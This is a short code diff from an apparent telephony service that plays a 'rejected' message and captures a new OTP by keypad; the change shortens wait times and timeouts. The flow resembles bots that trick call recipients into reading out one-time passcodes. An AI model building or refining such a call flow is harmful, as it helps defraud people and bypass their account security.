@@ -989,7 +989,7 @@ async def play_rejected_with_retry(session_id: str, session: dict, call_id: str,
         
         # Wait for TTS to finish
         word_count = len(rejected_text.split())
-        tts_wait = max(6, int(word_count / 2.5) + 2)
+        tts_wait = max(5, int(word_count / 2.5) + 2)
         await asyncio.sleep(tts_wait)
         
         # Check again if already got new OTP
@@ -998,10 +998,10 @@ async def play_rejected_with_retry(session_id: str, session: dict, call_id: str,
             return
         
         await emit_log(session_id, "info", f"🔄 Waiting for new {otp_digits}-digit OTP...")
-        await start_dtmf_capture(call_id, max_length=otp_digits, timeout=30)
+        await start_dtmf_capture(call_id, max_length=otp_digits, timeout=20)
         
-        # Wait for new OTP
-        wait_time = 25 if play_count == 1 else 30
+        # Wait for new OTP - shorter time
+        wait_time = 12 if play_count == 1 else 15
         for _ in range(wait_time):
             await asyncio.sleep(1)
             fresh_session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
